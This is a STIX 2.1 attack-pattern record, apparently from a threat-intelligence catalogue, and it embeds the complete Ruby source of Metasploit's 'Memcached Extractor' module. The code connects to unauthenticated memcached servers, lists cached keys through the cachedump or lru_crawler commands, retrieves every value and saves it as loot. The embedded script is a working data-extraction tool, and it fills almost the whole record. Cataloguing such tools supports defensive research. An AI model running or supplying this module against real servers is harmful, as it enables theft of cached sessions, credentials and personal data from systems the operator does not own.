{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d413d267-41e7-4f99-9eeb-6fcf59e269c9",
    "created": "2024-08-14T16:31:40.829454Z",
    "modified": "2024-08-14T16:31:40.829459Z",
    "name": "Memcached Extractor",
    "description": "( This module extracts the slabs from a memcached instance.  It then finds the keys and values stored in those slabs. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/memcached_extractor.rb",
            "external_id": "memcached_extractor.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/memcached/memcached/blob/master/doc/protocol.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'          => 'Memcached Extractor',\n      'Description'   => %q(\n        This module extracts the slabs from a memcached instance.  It then\n        finds the keys and values stored in those slabs.\n      ),\n      'Author'        => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],\n      'License'       => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'https://github.com/memcached/memcached/blob/master/doc/protocol.txt']\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(11211)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('MAXKEYS', [true, 'Maximum number of keys to be pulled from each slab', 100]),\n        OptInt.new('PRINTKEYS', [true, 'Number of keys shown in preview table for each instance', 10])\n      ], self.class\n    )\n  end\n\n  def max_keys\n    datastore['MAXKEYS'].to_i\n  end\n\n  def print_keys\n    datastore['PRINTKEYS'].to_i\n  end\n\n  def localhost?(ip)\n    %w(localhost 127.0.0.1).include?(ip)\n  end\n\n  # Returns array of keys for all slabs\n  def enumerate_keys\n    keys = []\n    enumerate_slab_ids.each do |sid|\n      sock.send(\"stats cachedump #{sid} #{max_keys}\\r\\n\", 0)\n      loop do\n        data = sock.recv(4096)\n        break if !data || data.length == 0 || data == \"END\\r\\n\" || data == \"ERROR\\r\\n\"\n        matches = data.scan(/^ITEM (?<key>.*) \\[/)\n        break if matches.empty?\n        keys = keys + matches.flatten!\n        break if data =~ /^END/\n      end\n    end\n    keys\n  end\n\n  # Returns array of slab ids as strings\n  def enumerate_slab_ids\n    sock.send(\"stats slabs\\r\\n\", 0)\n    slab_ids = []\n    loop do\n      data = sock.recv(4096)\n      break if !data || data.length == 0\n      matches = data.scan(/^STAT (?<slab_id>(\\d)*):/)\n      slab_ids << matches\n      break if data =~ /^END/\n    end\n    slab_ids.flatten!\n    slab_ids.uniq! || []\n  end\n\n  def enumerate_keys_lru\n    keys = []\n    sock.send(\"lru_crawler metadump all\\r\\n\", 0)\n    loop do\n      data = sock.recv(4096)\n      break if !data || data.length == 0 || data == \"END\\r\\n\" || data == \"ERROR\\r\\n\"\n      matches = data.scan(/^key=(?<key>.*) exp=/)\n      break if matches.empty?\n      keys = keys + matches.flatten!\n      break if data =~ /^END/\n      data = ''\n    end\n    keys\n  end\n\n  def data_for_keys(keys = [])\n    all_data = {}\n    keys.each do |key|\n      sock.send(\"get #{key}\\r\\n\", 0)\n      data = []\n      loop do\n        data_part = sock.recv(4096)\n        break if !data_part || data_part.length == 0\n        data << data_part\n        break if data_part =~ /^END/\n      end\n      all_data[key] = data.join\n    end\n    all_data\n  end\n\n  def determine_version\n    sock.send(\"version\\r\\n\", 0)\n    stats = sock.recv(4096)\n    if /^VERSION (?<version>[\\d\\.]+)/ =~ stats\n      version\n    else\n      nil\n    end\n  end\n\n  def run_host(ip)\n    peer = \"#{ip}:#{rport}\"\n    vprint_status(\"Connecting to memcached server...\")\n    begin\n      connect\n      if (version = determine_version)\n        vprint_good(\"Connected to memcached version #{version}\")\n        if (Rex::Version.new(version) >= Rex::Version.new('1.5.4'))\n          command_string = \"lru_crawler\"\n        else\n          command_string = 'cachedump'\n        end\n        vprint_status(\"Using #{command_string} to enumerate keys\")\n        unless localhost?(ip)\n          report_service(\n            host: ip,\n            name: 'memcached',\n            port: rport,\n            proto: 'tcp',\n            info: version\n          )\n        end\n      else\n        print_error(\"unable to determine memcached protocol version\")\n        return\n      end\n      if(command_string=='cachedump')\n        keys = enumerate_keys\n      else\n        keys = enumerate_keys_lru\n      end\n      print_good(\"Found #{keys.size} keys\")\n      return if keys.size == 0\n\n      data = data_for_keys(keys)\n      result_table = Rex::Text::Table.new(\n        'Header'  => \"Keys/Values Found for #{peer}\",\n        'Indent'  => 1,\n        'Columns' => [ 'Key', 'Value' ]\n      )\n      data.take(print_keys).each { |key, value| result_table << [key, value.inspect] }\n      print_line\n      print_line(\"#{result_table}\")\n      unless localhost?(ip)\n        path = store_loot('memcached.dump', 'text/plain', ip, data, 'memcached.txt', 'Memcached extractor')\n        print_good(\"memcached loot stored at #{path}\")\n      end\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout\n      vprint_error(\"Could not connect to memcached server!\")\n    end\n  end\nend\n"
}